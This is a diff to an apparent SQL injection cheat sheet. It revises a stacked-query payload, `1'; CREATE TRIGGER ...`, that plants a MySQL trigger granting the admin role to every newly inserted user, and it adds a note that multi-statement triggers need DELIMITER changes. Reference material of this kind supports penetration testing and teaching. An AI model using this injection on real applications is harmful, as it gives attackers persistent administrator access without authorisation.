@@ -171,9 +171,13 @@ Some file operations benefit from stacked queries when combined with other comma
 
 ### Creating Triggers
 
+Single-statement triggers can be created without DELIMITER changes:
+
 ```sql
-1'; CREATE TRIGGER after_user_insert AFTER INSERT ON users FOR EACH ROW BEGIN UPDATE users SET role='admin' WHERE id=NEW.id; END; -- -
+1'; CREATE TRIGGER after_user_insert AFTER INSERT ON users FOR EACH ROW UPDATE users SET role='admin' WHERE id=NEW.id; -- -
 ```
+
+**Note:** Multi-statement triggers using BEGIN...END blocks require DELIMITER changes, which are only available in the mysql CLI (not through most database drivers).
 
 ### Practical Attack Pattern
 
